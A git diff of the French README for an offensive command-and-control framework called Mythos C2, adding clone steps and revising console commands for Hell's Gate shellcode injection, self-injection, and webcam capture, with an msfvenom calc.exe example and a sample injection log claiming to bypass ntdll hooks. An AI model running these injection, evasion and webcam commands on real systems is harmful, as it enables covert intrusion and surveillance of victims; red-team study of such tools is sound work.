@@ -1,4 +1,4 @@
-# Mythos C2 Framework
+﻿# Mythos C2 Framework
 
 <p align="center">
   <img src="./mythos_c2_logo.png" alt="Mythos C2 Logo" width="300" />
@@ -107,6 +107,13 @@ Agent                                    Serveur
 
 ## Installation & Démarrage
 
+### Clone du projet
+
+```bash
+git clone https://github.com/SHERKO10/Mythos.git
+cd Mythos
+```
+
 ### Prérequis
 
 ```bash
@@ -212,6 +219,12 @@ go run cmd/console/main.go --api http://127.0.0.1:8443
 
 #### Commandes disponibles dans la console :
 
+Vous pouvez afficher la liste des commandes disponibles à tout moment avec :
+
+```text
+help
+```
+
 ```text
 # Navigation
 mythos > agents                   # Liste les agents connectés
@@ -238,8 +251,8 @@ mythos [ID] > sleep <secondes>    # Modifier l'intervalle de beacon
 mythos [ID] > kill                # Terminer l'agent
 
 # Evasion & Recon
-mythos [ID] > hellsgate <PID>:<B64>  # Injection shellcode via Hell's Gate
-mythos [ID] > hellsgate_local <B64>  # Self-injection via Hell's Gate
+mythos [ID] > hellsgate <PID> <chemin du B64>  # Injection shellcode via Hell's Gate
+mythos [ID] > hellsgate_local <chemin du B64>  # Self-injection via Hell's Gate
 mythos [ID] > webcam_snap            # Capture photo depuis la webcam
 ```
 
@@ -303,11 +316,9 @@ Le framework intègre la technique avancée **Hell's Gate** (avec fallback **Hal
 
 #### Exemple pratique d'injection
 
-1. **Générer un shellcode (sur Kali)**
+1. **Générer un shellcode binaire (sur Kali)**
 ```bash
-# Exemple : shellcode pour lancer la calculatrice, encodé en base64
-msfvenom -p windows/x64/exec CMD="calc.exe" -f raw | base64 -w 0
-# Copiez la sortie base64 (ex: MjQ4...=)
+msfvenom -p windows/x64/exec CMD="calc.exe" -f raw -o calc.bin
 ```
 
 2. **Trouver un processus cible inoffensif**
@@ -318,13 +329,14 @@ mythos [ID] > proclist
 
 3. **Exécuter l'injection silencieuse**
 ```text
-mythos [ID] > hellsgate <PID> <CHEMIN_SHELLCODE>
+mythos [ID] > inject -m hellsgate -p 1337 -f C:\chemin\vers\calc.bin
 [*] [Hell's Gate] Shellcode injecté avec succès dans PID 1337
     Technique: Direct syscalls (bypass hooks ntdll)
     SSN NtAllocateVirtualMemory: 0x0018
     SSN NtCreateThreadEx: 0x00C1
 ```
-*(Le shellcode est exécuté directement dans le kernel sans déclencher les APIs surveillées !)*
+
+> Le fichier fourni à la commande doit être un shellcode au format binaire brut `.bin` (et non un `.exe`, ni un `.dll`).
 
 ---
 
